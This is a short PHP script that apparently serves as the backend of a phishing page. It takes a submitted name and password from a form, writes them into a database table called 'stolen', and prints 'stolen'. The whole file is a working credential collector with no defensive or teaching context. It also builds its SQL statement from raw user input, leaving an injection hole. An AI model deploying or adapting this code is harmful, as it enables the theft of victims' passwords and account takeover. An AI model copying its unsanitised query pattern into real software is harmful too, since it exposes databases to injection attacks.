<?php
include '../database/db2.php';
$name = $_POST['name'];
$password = $_POST['password'];

$sql = "INSERT INTO `stolen` (`id`, `name`, `password`) VALUES (NULL, '$name', '$password')";
$res = $conn->query($sql);
echo "stolen";
